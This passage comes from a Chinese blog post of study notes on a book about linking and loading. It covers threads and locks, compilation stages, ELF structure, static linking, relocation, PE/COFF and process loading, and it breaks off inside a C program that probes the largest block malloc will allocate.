<h4 id="Linux的多线程"><a href="#Linux的多线程" class="headerlink" title="Linux的多线程"></a>Linux的多线程</h4><p>Linux将所有的执行实体（无论线程、进程）都成为<strong>任务</strong>（Task），任务在概念上类似于一个单线程的进程。不过Linux下不同的任务之间可以选择共享内存空间，所以实际上，共享了同一个内存空间的多个任务构成了一个进程，这些任务就是这个进程里的线程。</p>
<h5 id="Linux创建新任务的方法"><a href="#Linux创建新任务的方法" class="headerlink" title="Linux创建新任务的方法"></a>Linux创建新任务的方法</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933415-967c977e-8e84-4af7-a0be-03ae39b23f30.png" alt><br>fork产生新任务的速度很快，因为并不复制原任务的内存空间，而是和原任务一起共享一个<strong>写时复制</strong> （Copy on Write, COW)<br><strong>写时复制：</strong> 两个任务可同时自由读取内存，当任意一个任务试图修改内存时，内存就会复制一份提供给修改方单独使用，以免影响到其他任务的使用</p>
<hr>
<h4 id="线程安全：同步与锁"><a href="#线程安全：同步与锁" class="headerlink" title="线程安全：同步与锁"></a>线程安全：同步与锁</h4><p>单指令操作（原子操作）不会被打断</p>
<h5 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h5><p>在一个线程访问数据未结束时，其他线程不得访问同一数据，同步最常见的方法就是使用<strong>锁</strong></p>
<h5 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h5><p>是一种非强制机制，每个线程在访问数据前首先试图获取锁，并在访问结束后释放。锁已被占用时，线程会等待其重新可用</p>
<ol>
<li><strong>二元信号量：</strong> 延申：（多元）信号量</li>
<li><strong>互斥量：</strong> 信号量可以被一个线程获取再由其他线程释放，但互斥量要求释放者必须是获取者</li>
<li><strong>临界区：</strong> 比互斥量更严格，对于一个进程创建的互斥量和信号量，另一个进程去获取该锁也是合法的。而<strong>临界区将作用范围限制在本进程</strong>。</li>
<li><strong>读写锁：</strong> 有两种获取：共享方式和独占方式<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933549-a64ddad4-f491-4b9c-a59a-b9d52654c161.png" alt></li>
</ol>
<h4 id="三种线程模型"><a href="#三种线程模型" class="headerlink" title="三种线程模型"></a>三种线程模型</h4><h5 id="一对一模型"><a href="#一对一模型" class="headerlink" title="一对一模型"></a>一对一模型</h5><p>一个用户使用的线程就唯一对应一个内核使用的线程（反过来就不一定，因为一个内核里的线程在用户态不一定有对应的线程存在）<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933679-90de8953-42eb-4e83-bc03-800ec82211ac.png" alt><br><strong>优点：</strong> 一个线程阻塞，其他线程不受影响<br><strong>缺点：</strong></p>
<ol>
<li>许多操作系统限制了内核线程的数量，一对一线程使用户线程数量也受到限制</li>
<li>许多操作系统内核线程调度时，上下文切换的开销大，导致用户线程执行效率下降</li>
</ol>
<h5 id="多对一模型"><a href="#多对一模型" class="headerlink" title="多对一模型"></a>多对一模型</h5><p>多个用户线程映射到一个内核线程，线程之间的切换由用户态的代码进行<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933813-344456d6-3991-4539-8040-06ca9350c26d.png" alt><br><strong>优点：</strong></p>
<ol>
<li>上下文切换更高效</li>
<li>线程数量几乎无限制<br><strong>缺点：</strong> 一个用户线程阻塞，其他所有线程都无法执行</li>
</ol>
<h5 id="多对多模型"><a href="#多对多模型" class="headerlink" title="多对多模型"></a>多对多模型</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933923-eb2b4c5c-9e38-41cc-bfe9-865ee8a67a49.png" alt><br><strong>优点：</strong></p>
<ol>
<li>一个用户线程阻塞不会使所有用户线程阻塞</li>
<li>用户线程数量也没什么限制</li>
</ol>
<h2 id="第二部分-静态链接"><a href="#第二部分-静态链接" class="headerlink" title="第二部分 静态链接"></a>第二部分 静态链接</h2><h2 id="第二章-编译和链接"><a href="#第二章-编译和链接" class="headerlink" title="第二章 编译和链接"></a>第二章 编译和链接</h2><p><strong>构建：</strong> 编译和链接合并到一起的过程</p>
<h3 id="被隐藏的过程"><a href="#被隐藏的过程" class="headerlink" title="被隐藏的过程"></a>被隐藏的过程</h3><p>又是熟悉的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello, world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p><strong>说明：</strong> 对于C程序，会被预编译成.i文件；对于C++程序，预编译成.ii文件<br><strong>命令：</strong> 对于hello.c文件<br><code>gcc -E hello.c -o hello.i</code><br>或者<code>cpp hello.c &gt; hello.i</code></p>
<hr>
<p><strong>处理规则：</strong></p>
<ol>
<li>删除所有<code>#define</code>并展开所有宏定义</li>
<li>处理所有条件预编译指令，如<code>#if</code> <code>#ifdef</code> <code>#elif</code> <code>#else</code> <code>#endif</code></li>
<li>递归处理<code>#include</code></li>
<li>删除所有注释</li>
<li>添加行号、文件标识符</li>
<li>保留所有<code>#pragma</code>编译器指令</li>
</ol>
<p>经过预编译后的.i文件不包含任何宏定义，因为所有宏定义都被展开，并且包含的文件也被插入到.i文件。<br>所以当无法判断宏定义是否正确或者头文件包含是否正确时，可查看预编译后的文件确定问题。</p>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934062-eab80846-a499-4ba1-9543-4bc68a8ecae2.png" alt><br><strong>过程说明：</strong> 扫描、语法分析、语义分析、源代码优化、代码生成、目标代码优化<br><strong>命令：</strong><br><code>gcc -S hello.i -o hello.s</code><br>或者<code>gcc -S hello.c -o hello.s</code></p>
<ol>
<li><strong>词法分析：</strong> 首先源代码程序被输入到<strong>扫描器</strong>，运用一种类似<strong>有限状态机</strong>的算法将源代码的字符序列分割成一系列<strong>记号</strong>。</li>
<li><strong>语法分析：</strong> 采用<strong>上下文无关语法</strong>对记号进行语法分析，生成以<strong>表达式</strong>为节点的<strong>语法树</strong>。</li>
<li><strong>语义分析：</strong> 生成标识语义的语法树。编译器能分析的是<strong>静态语义</strong>，在编译期间可以确定（比如将浮点型赋值给一个指针）；<strong>动态语义</strong>只有在运行期间才能确定。（比如0作为除数）</li>
<li><strong>中间语言生成：</strong> 直接在语法树上优化比较困难，所以<strong>源代码优化器</strong>（Source Code Optimizer）往往将整个语法树转换成<strong>中间代码</strong>。它是语法树的顺序表示，非常接近目标代码。</li>
</ol>
<hr>
<p>中间代码使编译器可分为前后端。前端负责产生机器无关的中间代码，后端将中间代码转换成目标机器代码</p>
<hr>
<ol>
<li><strong>目标代码生成与优化：</strong> 代码生成器依赖目标机器将中间代码转成目标机器代码，代码优化器负责对目标机器代码进行优化（如选择合适的寻址方式）</li>
</ol>
<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p><strong>说明：</strong> 根据汇编指令和机器指令的对照表一一翻译<br><strong>命令：</strong><br><code>as hello.s -o hello.o</code><br>或者<code>gcc -c hello.s -o hello.o</code><br>或者<code>gcc -c hello.c -o hello.o</code></p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p><strong>C/C++模块之间通信方式：</strong></p>
<ol>
<li>模块间的函数调用</li>
<li>模块间的变量访问</li>
</ol>
<p>这两种方式可以归结为一种：模块间符号的引用。而模块的拼接过程就是<strong>链接</strong><br><strong>过程：</strong> 地址和空间分配、符号决议（确保所有目标文件中的符号引用都有唯一的定义）、重定位<br>最基本的静态链接过程：每个模块的源码文件.c经过编译器编译成目标文件.o，目标文件和库（最常见的是运行时库Runtime Library）一起链接成可执行文件</p>
<h2 id="第三章-目标文件里有什么"><a href="#第三章-目标文件里有什么" class="headerlink" title="第三章 目标文件里有什么"></a>第三章 目标文件里有什么</h2><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>PE和ELF都是COFF的变种，COFF的主要贡献：在目标文件中引入<strong>段</strong>机制+定义了调试数据的格式。<br>按照可执行文件存储的文件有：可执行文件、动态链接库（如Windows的DLL和Linux的so）、静态链接库（如Windows的.lib和Linux的.a）<br>ELF文件标准里，将系统中采用<strong>ELF格式的文件归为4类</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934168-d5e52dc5-09e4-4a8c-bb78-1e6eb5ca20a2.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934284-bb0c00e5-e754-49a0-80f9-c89b6d86ced2.png" alt></p>
<h3 id="目标文件是什么样的"><a href="#目标文件是什么样的" class="headerlink" title="目标文件是什么样的"></a>目标文件是什么样的</h3><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934397-f9cf89c8-022e-42f2-987f-ed465ad5995c.png" alt></p>
<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><ol>
<li>源代码编译后的机器指令存放在<strong>代码段</strong>.text或者.code</li>
<li>初始化的全局变量或局部静态变量存放在<strong>数据段</strong>.data</li>
<li>未初始化的变量存放在<strong>BSS段</strong>，准确地说是.bss段为它们预留了空间。（注意：初始化为0的可以被认为是未初始化的，被优化掉放在.bss可以节省磁盘空间，因为.bss不占磁盘空间）</li>
<li>除了以上三个基本的段以外，还有只读数据段.rodata，注释信息段.comment，堆栈提示段.note.GNU-stack</li>
</ol>
<h4 id="指令操作"><a href="#指令操作" class="headerlink" title="指令操作"></a>指令操作</h4><ol>
<li><code>gcc -c simple.c</code> -c表示只编译，不链接</li>
<li><code>objdump -h simple.o</code> objdump查看目标文件结构及内容，-h就是把ELF文件的各个段基本信息打印出来，-x可以打印更多的信息<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934488-4d116190-0e4d-4177-8549-ec7997cde685.png" alt></li>
<li><code>size simple.o</code> 可以查看ELF文件代码段、数据段、BSS段的长度</li>
<li><code>objdump -s -d simple.o</code> -s可以将所有段的内容以16进制打印，-d将所有包含指令的段反汇编<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934910-06004ed7-42cd-4be1-ab8c-ce11aaa9b94e.png" alt></li>
</ol>
<h4 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935005-47fe9f8d-90f4-4084-9189-108b3e8cf899.png" alt></p>
<h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p>还是这张图<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935175-fedde66c-df06-42e9-82fa-38b213dfbe43.png" alt></p>
<h4 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h4><p>描述了文件基本属性，包括ELF文件版本、目标机器型号、程序入口地址等<br><strong>命令：</strong> <code>readelf -h simple.o</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935279-f2cda133-6299-4d3d-a0ed-6f9e38744fa5.png" alt><br>可以看到，ELF文件头中定义了：ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表位置和长度、段的数量等。</p>
<hr>
<p>ELF有32位和64位版本，它们的文件头内容是一样的，只不过有些成员的大小不一样。ELF文件头结构及相关常数被定义在<code>/usr/include/elf.h</code> ，其中自定义了一些类型<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935382-8826d20c-94e0-4c63-8cfa-a6a81cbd82a4.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935552-24d6459e-e7ff-4b0b-97fb-2601ea2f58f7.png" alt></p>
<hr>
<p>Elf32_Ehdr结构体中定义的成员含义为<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935648-f724c422-c6a2-46e9-95c0-d3ae7678f9ae.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935867-a5001f50-f9b6-4b4e-b8b0-aae2fbc05b6d.png" alt></p>
<h5 id="ELF魔数"><a href="#ELF魔数" class="headerlink" title="ELF魔数"></a>ELF魔数</h5><p>前四个字节是所有ELF文件都必须相同的标识码<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936044-404e1802-1f2c-4606-9e87-c2eb8561149c.png" alt><br>字节序和ELF版本的规定<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936120-20f9baa2-8f05-4e52-aa56-7a8f089faddd.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936199-ad0f67a4-ab29-4083-9e42-af6fa6555cbc.png" alt></p>
<h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936291-c8ac480c-f12e-44c3-a3fd-84a4447f2e03.png" alt><br>e<em>type成员表示ELF文件类型，每个文件类型对应一个常量，系统通过这个常量来判断ELF的真正文件类型，而不是通过扩展名。相关常量以“EL</em>”开头<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936378-d16f743e-fc85-4391-8af9-df1ba87a0364.png" alt></p>
<h4 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h4><p>段表位置由ELF文件头中的e_shoff决定，这里的712是十进制<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936507-8ed26723-7152-4316-8190-3dcc498866ab.png" alt><br><strong>查看命令：</strong> <code>readelf -S hello.o</code>（注意objdump会省略辅助性的段，readelf查看的才是真正的段结构）<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936597-c2a5170f-88da-4246-93b7-0da784b868ec.png" alt></p>
<h5 id="段描述符Elf32-Shdr"><a href="#段描述符Elf32-Shdr" class="headerlink" title="段描述符Elf32_Shdr"></a>段描述符Elf32_Shdr</h5><p>段表的结构是一个以Elf32_Shdr结构体为元素的数组，对于以上hello.o就是有13个元素的数组。其中第一个元素是无效的，所以共有12个有效的段<br>Elf32_Shdr的结构同样在<code>/usr/include/elf.h</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936714-33128f74-8239-4328-b909-85d89a7d997a.png" alt><br>各个成员的含义<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936804-4f5ff992-41e5-40c4-9936-6e776263a396.png" alt></p>
<h3 id="链接的接口——符号"><a href="#链接的接口——符号" class="headerlink" title="链接的接口——符号"></a>链接的接口——符号</h3><p>在链接中，将函数和变量统称为<strong>符号</strong>，函数名和变量名就是符号名。每个目标文件都有一个响应的符号表，每个符号有对应的符号值，对于变量和函数来说，符号值就是它们的地址。<br><code>nm hello.o</code>可以查看ELF文件的符号表<br><code>readelf -s hello.o</code>可以查看更详细额符号信息<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361936973-4919b95f-51ad-43b0-8954-ea8304cbc0f4.png" alt><br>其中，Value为符号值（函数相对于代码段起始位置的偏移量），Size为符号大小（函数指令所占的字节数），Type和Bind为符号类型和绑定信息，Ndx为符号所在段。<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937064-d85f928c-ded0-42de-afbb-2b76b9770bab.png" alt></p>
<h4 id="C-符号修饰"><a href="#C-符号修饰" class="headerlink" title="C++符号修饰"></a>C++符号修饰</h4><p>区别重载的函数+防止静态变量冲突</p>
<h4 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h4><p>Linux版本的gcc对extern “C”里面的符号不做修饰，可以利用声明一个与CPP中某些符号修饰结果相同的外部符号，直接获取其对应的值</p>
<h2 id="第四章-静态链接"><a href="#第四章-静态链接" class="headerlink" title="第四章 静态链接"></a>第四章 静态链接</h2><h3 id="空间地址分配"><a href="#空间地址分配" class="headerlink" title="空间地址分配"></a>空间地址分配</h3><p>我们输入多个目标文件，链接器怎么将它们的各个段合并到输出文件？或者说，输出文件中的空间如何分配给输入文件？</p>
<h4 id="按序叠加"><a href="#按序叠加" class="headerlink" title="按序叠加"></a>按序叠加</h4><p>存在的问题：输出文件会有很多零散的段，造成内存空间大量的内存碎片。</p>
<h4 id="相似段合并"><a href="#相似段合并" class="headerlink" title="相似段合并"></a>相似段合并</h4><p>问：这里的<strong>空间分配</strong>是指什么空间？<br>答：虚拟地址空间的分配</p>
<hr>
<p><strong>链接器空间分配的基本策略：</strong> （两步链接）</p>
<ol>
<li>空间与地址分配</li>
<li>符号解析与<strong>重定位</strong> （核心）</li>
</ol>
<hr>
<p><strong>命令：</strong></p>
<ol>
<li><code>ld a.o b.o -e main -o ab</code> -e表示将main作为程序入口，ld默认入口为_start，<code>-o ab</code>  表示链接输出文件名为ab，默认为a.out</li>
<li><code>objdump -h filename</code> 可查看链接前后地址的分配情况</li>
</ol>
<p><strong>VMA：</strong> Virtual Memory Address虚拟地址</p>
<h4 id="确定符号地址"><a href="#确定符号地址" class="headerlink" title="确定符号地址"></a>确定符号地址</h4><p>链接器进行空间地址分配后，各个段的虚拟地址就确定了，链接器开始计算每个符号的虚拟地址。</p>
<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>如果.text有要被重定位的地方，会有一个相对应的.rel.text；如果.data又要被重定位的地方，就会有一个.re.data保存数据段的重定位表。每个要被重定位的地方叫一个重定位入口<br><code>objdump -r a.o</code> 查看目标文件的重定位表</p>
<h4 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h4><p>重定位过程中，每个重定位入口都是对一个符号的引用，当链接器需要对某个符号的引用进行重定位时，它就要确定这个符号的目标地址。链接器就会查找所有输入目标文件的符号表组成的全局符号表，找到对应的符号后进行重定位。</p>
<h4 id="指令修正方式"><a href="#指令修正方式" class="headerlink" title="指令修正方式"></a>指令修正方式</h4><p>对于32位x86平台下的ELF文件的重定位入口所修正的指令寻址方式只有两种：<strong>绝对近址32位寻址、相对近址32位寻址</strong>。<br>区别：绝对寻址修正后的地址为该符号的实际地址，相对寻址修正后的地址是符号距离被修正位置的<strong>地址差</strong>。</p>
<h3 id="COMMON块"><a href="#COMMON块" class="headerlink" title="COMMON块"></a>COMMON块</h3><p>拓展：这种机制最早来源于Fortran，早期Fortran没有动态分配空间的机制，程序员必须声明它所需要的临时使用空间的大小。这种空间就是COMMON块，当不同的目标文件需要的COMMON块大小不一致时，以最大的那块为准。COMMON块可以应对一个弱符号定义在多个目标文件中，而它们类型又不同的情况。<br>一旦一个未初始化的全局变量不是以COMMON块的形式存在时，那么它就相当于一个强符号，如果其他目标文件中还有同一个变量的强符号定义，链接时就会发生符号重复定义的错误。</p>
<h3 id="C-问题"><a href="#C-问题" class="headerlink" title="C++问题"></a>C++问题</h3><ol>
<li>重复代码消除</li>
<li>全局构造与析构</li>
</ol>
<h4 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a>重复代码消除</h4><p>模板、外部内联函数、虚函数表都有可能在不同的编译单元里产生相同的代码<br>方法：将每个模板的实例代码都单独存放到一个段里，每个段只包含一个模板实例。但是相同名称的段可能拥有不同的内容，导致编译出来的实际代码有所不同，这种情况，链接器随意选择一个副本作为链接的输入。<br><strong>函数级别链接：</strong> 让所有函数像上文提到的模板函数那样单独保存到一个段，链接器需要某个函数就合并到输出文件，对于没有用的函数则抛弃。</p>
<h4 id="全局构造与析构"><a href="#全局构造与析构" class="headerlink" title="全局构造与析构"></a>全局构造与析构</h4><p>全局对象的构造函数在main函数之前被执行，全局对象的析构函数在main之后执行<br>ELF文件两个特殊的段：.init（进程的初始化代码，main以前执行）和.fini（进程终止代码指令，main以后执行）</p>
<h3 id="静态链接库"><a href="#静态链接库" class="headerlink" title="静态链接库"></a>静态链接库</h3><ol>
<li>列举静态库文件libc.a中的目标文件 <code>ar -t libc.a</code><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937245-46fa386c-3933-4432-aa95-5ebbbf5155d1.png" alt></li>
<li>找到printf所在的目标文件 <code>objdump -t libc.a</code></li>
</ol>
<p><code>gcc -c -fno-builtin hello.c</code> -fno-builtin 关闭内置函数优化<br><code>gcc -static --verbose -fno-builtin hello.c</code> -verbose 将编译链接的中间步骤打印出来<br>问：为什么静态运行库里一个目标文件只包含一个函数？<br>答：如果很多函数放在一个目标文件中，很多没用的函数也会被链接到输出结果中，造成空间的浪费。</p>
<h3 id="链接过程控制"><a href="#链接过程控制" class="headerlink" title="链接过程控制"></a>链接过程控制</h3><p>Windows操作系统内核：C:\Windows\System32\ntoskrnl.exe<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361937341-746c1000-2509-4c12-8c12-e0bab2877fc7.png" alt></p>
<h4 id="连接控制脚本"><a href="#连接控制脚本" class="headerlink" title="连接控制脚本"></a>连接控制脚本</h4><p><code>ld -verbose</code> 查看ld默认的链接脚本<br><code>ld -T link.script</code> 指定自己写的脚本为链接控制脚本</p>
<h2 id="第五章-Windows-PE-COFF"><a href="#第五章-Windows-PE-COFF" class="headerlink" title="第五章 Windows PE/COFF"></a>第五章 Windows PE/COFF</h2><p>PE/COFF文件与ELF文件非常相似，它们都是基于段的结构的二进制文件格式。Windows下最常见的目标文件格式就是COFF格式。<br>COFF文件有一个.drectve段，其中保存编译器传递给链接器的命令行参数，可以通过这个段实现指定运行库等功能。<br>Windows下的可执行文件、动态链接库等都使用PE文件格式，PE文件格式是COFF文件格式的改进版本，增加了PE文件头、数据目录等结构。</p>
<h2 id="第三部分-装载与动态链接"><a href="#第三部分-装载与动态链接" class="headerlink" title="第三部分 装载与动态链接"></a>第三部分 装载与动态链接</h2><h2 id="第六章-可执行文件的装载与进程"><a href="#第六章-可执行文件的装载与进程" class="headerlink" title="第六章 可执行文件的装载与进程"></a>第六章 可执行文件的装载与进程</h2><h3 id="进程与程序的区别"><a href="#进程与程序的区别" class="headerlink" title="进程与程序的区别"></a>进程与程序的区别</h3><p>程序是一个静态的概念，就是一些预先编译好的指令和数据集合的一个文件；进程是一个动态的概念，是程序运行时的一个过程。<br>程序像菜谱，进程像做菜的过程。</p>
<h3 id="PAE-（Physical-Address-Extension）"><a href="#PAE-（Physical-Address-Extension）" class="headerlink" title="PAE （Physical Address Extension）"></a>PAE （Physical Address Extension）</h3><p>32位的CPU，程序使用的虚拟地址空间不能超过4GB；计算机的内存空间是可以超过的，通过PAE可以完成。<br>应用程序如何使用这些大于常规的内存空间？<br><strong>窗口映射</strong>：把额外的内存映射到进程地址空间。<br>举例：比如32位CPU，有一个应用程序用一段256MB的虚拟地址空间做窗口，程序可以从高于4GB的物理空间中申请多个256MB的物理空间，编号成ABC，然后根据需要将窗口映射到不同的物理空间块，用到A的时候就把窗口映射到A，用到B就映射过去，如此重复。<br>Windows下这种访问内存的操作是AWE（Address Windowing Extension）；<br>Linux下采用mmap()系统调用实现。</p>
<h3 id="装载的方式"><a href="#装载的方式" class="headerlink" title="装载的方式"></a>装载的方式</h3><p>静态装载方法：将程序运行所需要的指令和数据全都装入内存。<br>动态装入：将程序最常用的部分留在内存，不太常用的部分存在磁盘。这样可以更有效的利用内存<br>典型的动态装载方法：<strong>覆盖装入</strong>（Overlay）和<strong>页映射</strong>（Paging）。原则上都是利用了程序的局部性原理。<br>覆盖装入已经几乎被淘汰了，其基本原理就是将有依赖关系的A和B内存覆盖，形成共享块内存区域，调用谁，覆盖管理器就把谁读入内存。<br>页映射是将内存和所有磁盘中的数据和指令按照页为单位进行划分，以后装在和操作的单位就是页。</p>
<h3 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h3><ol>
<li><strong>创建一个虚拟地址空间：</strong> 虚拟空间由一组页映射函数将虚拟空间的各个页映射到响应的物理空间，所以创建虚拟空间实际上不是创建空间，而是创建映射函数所需要的数据结构。</li>
<li><strong>读取可执行文件头，建立虚拟空间与可执行文件的映射关系</strong></li>
<li><strong>将CPU指令寄存器设置成可执行文件入口，启动运行：</strong> 可以认为操作系统执行了一条跳转指令，直接跳转到可执行文件的入口地址。（ELF文件头保存有入口地址）</li>
</ol>
<h3 id="section-和-segment"><a href="#section-和-segment" class="headerlink" title="section 和 segment"></a>section 和 segment</h3><p>从链接的角度看，ELF文件按Section存储<br>从装载的角度看，ELF文件按Segment划分<br>ELF可执行文件和共享库文件有程序头表专门保存Segment。而ELF目标文件由于不需要装载，所以没有程序头表。</p>
<h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><p>堆和栈在进程的虚拟空间中也是以VMA（Virtual Memory Area虚拟内存区域）的形式存在</p>
<h4 id="进程虚拟地址空间小结"><a href="#进程虚拟地址空间小结" class="headerlink" title="进程虚拟地址空间小结"></a>进程虚拟地址空间小结</h4><ol>
<li>操作系统通过给进程空间划分出一个个VMA来管理进程的虚拟空间</li>
<li>基本原则是将相同权限属性的、有相同影像文件的映射成一个VMA</li>
<li>一个进程基本上可以分成4中VMA</li>
</ol>
<h4 id="堆的最大申请数量"><a href="#堆的最大申请数量" class="headerlink" title="堆的最大申请数量"></a>堆的最大申请数量</h4><ul>
<li>测试 malloc 最大内存申请量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> maximum = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> blocksize[] = &#123; <span class="number">1024</span> * <span class="number">1024</span>,<span class="number">1024</span>,<span class="number">1</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> i, count;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (count = <span class="number">1</span>;; count++) &#123;</span><br><span class="line">			<span class="keyword">void</span>* block = <span class="built_in">malloc</span>(maximum + blocksize[i] * count);</span><br><span class="line">			<span class="keyword">if</span> (block) &#123;</span><br><span class="line">				maximum = maximum + blocksize[i] * count;</span><br><span class="line">				<span class="built_in">free</span>(block);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	